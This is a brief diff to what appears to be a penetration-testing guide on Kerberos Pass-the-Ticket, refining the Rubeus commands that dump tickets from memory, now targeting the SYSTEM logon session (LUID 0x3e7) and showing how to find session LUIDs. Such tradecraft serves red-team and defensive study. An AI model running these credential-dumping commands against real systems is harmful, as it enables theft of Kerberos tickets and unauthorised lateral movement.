@@ -147,7 +147,8 @@ Pass-the-Ticket injects an existing Kerberos ticket (TGT or TGS) into your curre
 ```
 # Dump all tickets from memory (Windows):
 Rubeus.exe dump /nowrap          # All tickets in current session
-Rubeus.exe dump /luid:0x...     # Specific logon session
+# Specific logon session — get the LUID first from `Rubeus.exe triage` or `klist sessions`:
+Rubeus.exe dump /luid:0x3e7 /nowrap       # 0x3e7 = SYSTEM logon session
 
 # List tickets in current session:
 Rubeus.exe triage               # Summary of all tickets
